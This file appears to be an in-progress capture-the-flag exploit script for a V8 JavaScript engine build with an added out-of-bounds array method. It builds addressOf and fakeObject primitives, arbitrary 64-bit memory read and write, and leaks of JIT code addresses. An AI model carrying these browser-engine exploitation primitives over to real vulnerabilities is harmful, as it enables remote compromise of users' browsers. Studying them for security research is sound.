// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
// 浮点数转换为64位无符号整数
function f2i(f)
{
	float64[0] = f;
	return bigUint64[0];
}
// 64位无符号整数转为浮点数
function i2f(i)
{
	bigUint64[0] = i;
	return float64[0];
}
// 64位无符号整数转为16进制字节串
function hex(i)
{
	return i.toString(16).padStart(16, "0");
}
// ××××××××2. addressOf和fakeObject的实现××××××××
var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];
var obj_array_map = obj_array.oob();
var float_array_map = float_array.oob();
function addressOf(obj_to_leak)
{
    obj_array[0] = obj_to_leak;
    obj_array.oob(float_array_map);
    let obj_addr = f2i(obj_array[0]) - 1n;//泄漏出来的地址-1才是真实地址
    obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
    return obj_addr;
}
function fakeObject(addr_to_fake)
{
    float_array[0] = i2f(addr_to_fake + 1n);//地址需要+1才是v8中的正确表达方式
    float_array.oob(obj_array_map);
    let faked_obj = float_array[0];
    float_array.oob(float_array_map); // 还原array类型以便后续继续使用
    return faked_obj;
}
var fake_array = [
	float_array_map,
	i2f(0n),
	i2f(0x41414141n),
	i2f(0x1000000000n),
	1.1,
	2.2
];

%DebugPrint(fake_array); // fake array map address
console.log("--------");
var fake_array_addr = addressOf(fake_array);
var fake_object_addr = fake_array_addr - 0x40n + 0x10n;
var fake_object = fakeObject(fake_object_addr);


function read64(addr)
{
	fake_array[2] = i2f(addr + 0x1n - 0x10n);
	var leak_info = f2i(fake_object[0]);
	//console.log("[*] leak addr: 0x" + hex(addr) + " data: 0x" + hex(leak_info));
	return leak_info;
}

function write64(addr, data)
{
	fake_array[2] = i2f(addr + 0x1n - 0x10n);
	fake_object[0] = i2f(data);
	//console.log("[*] write data to addr: 0x" + hex(addr) + " data: 0x" + hex(data));
}

function t(i, obja)
{

	var test_obj = [1.1, 2.2];
%DebugPrint(test_obj);
var test_obj_addr = addressOf(test_obj);
console.log("[*] leak object addr: 0x" + hex(test_obj_addr));
%DebugPrint(test_obj.constructor);
var leak_code_addr = read64(addressOf(test_obj.constructor) + 0x30n);
console.log("[*] leak code addr : 0x" + hex(leak_code_addr));
var leak_constructor_addr = read64(leak_code_addr + 0x41n);
console.log("[*] leak constructor addr : 0x" + hex(leak_constructor_addr));
console.log("---------------");
%DebugPrint(t);
var leak_t_addr = read64(addressOf(t) + 0x30n);
console.log("[*] leak t addr : 0x" + hex(leak_t_addr));
var leak_t_code_addr = read64(leak_t_addr + 0x41n);
console.log("[*] leak t code addr : 0x" + hex(leak_t_code_addr));

	%SystemBreak();
//	var a = [1.1,2.2,3.3];
//var address = addressOf(a);
//var read = read64(address);
//console.log("[*]read 0x"+hex(address)+":0x"+hex(read));
//%DebugPrint(a);
//%SystemBreak();
//write64(address,0x01020304n);
//%SystemBreak();
}

for(var i = 0;i < 100000; i++)
	t(i);
